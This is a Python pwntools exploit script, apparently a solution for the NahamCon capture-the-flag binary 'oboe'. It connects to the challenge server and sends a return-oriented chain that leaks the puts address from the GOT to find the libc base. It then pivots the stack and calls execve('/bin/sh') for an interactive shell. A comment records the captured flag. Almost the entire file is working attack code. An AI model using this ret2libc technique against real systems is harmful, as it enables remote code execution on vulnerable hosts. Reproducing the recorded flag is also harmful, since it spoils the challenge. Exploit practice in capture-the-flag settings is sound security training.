#!/usr/bin/env python
from pwn import *
from time import sleep

exe = ELF("./oboe")
libc = ELF("./libc.so.6")

context.binary = exe

sshc = None
r = None
nc = "nc challenge.nahamcon.com 32350"
ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')
SLEEP_TIME = 0

# Communication ----------------------------------------------------------
tobytes     = lambda x: x if isinstance(x, bytes) else str(x).encode()
readl       = lambda : r.readline()
recvuntil   = lambda x: r.recvuntil(tobytes(x))

def sendl(x):
    sleep(SLEEP_TIME)
    r.sendline(tobytes(x))


def send(x):
    sleep(SLEEP_TIME)
    r.send(tobytes(x))


# Logging ----------------------------------------------------------------
def log(msg, value, length=25):
    print(msg, ' '*(length - len(msg)), ':', value)


def logh(msg, value):
    log(msg, hex(value))


# Helpers ----------------------------------------------------------------
def padPayload(s, size=70, used=0, extra=0):
    assert len(s) < size, "Payload length bigger than size! ("+str(size)+")"
    return b'A'*(size - len(s) - 8*used - extra)


def conn():
    global r, nc, ssh_conn, sshc
    if args.LOCAL:
        r = process([exe.path])
    
    elif args.SSH:
        sshc = ssh(ssh_conn[2], ssh_conn[0], ssh_conn[1], ssh_conn[3])
        r = sshc.process([ssh_conn[4]])

    else:
        host = nc.replace('nc ', '').split(' ')
        r = remote(host[0], int(host[1]))
    
    return r


def main():
    global r
    r = conn()
    
    r.sendline(b"a"*64)
    r.sendline(b"a"*64)
    
    pop_ebx_ebp = 0x0804858b
    writeable = 0x0804a000 + 0x205
    leave_ret = 0x08048485
    
    pause()
    toleak = "puts"
    payload = b"a"*10
    payload += p32(exe.symbols.puts)
    payload += p32(pop_ebx_ebp)
    payload += p32(exe.got[toleak])
    payload += p32(writeable)
    
    payload += p32(exe.symbols.getInput)
    payload += p32(leave_ret)
    payload += p32(writeable)
    
    payload += padPayload(payload, 63)
    r.sendline(payload)
    
    r.recvuntil(b"AAAAAAAAA\n")
    
    leak = u32(r.recv(4))
    logh("Leak", leak)
    
    libc_base = leak - libc.symbols[toleak]
    logh("Libc base", libc_base)
    
    binsh = libc_base + next(libc.search(b"/bin/sh"))
    execve = libc_base + libc.symbols.execve
    
    payload2 = b"a"*4
    payload2 += p32(execve)
    payload2 += p32(pop_ebx_ebp)
    payload2 += p32(binsh)
    payload2 += p64(0)
    
    r.sendline(payload2)

    r.interactive() # flag{a9e49be5177047784b9f7e3a5bf1d864}


if __name__ == "__main__":
    main()

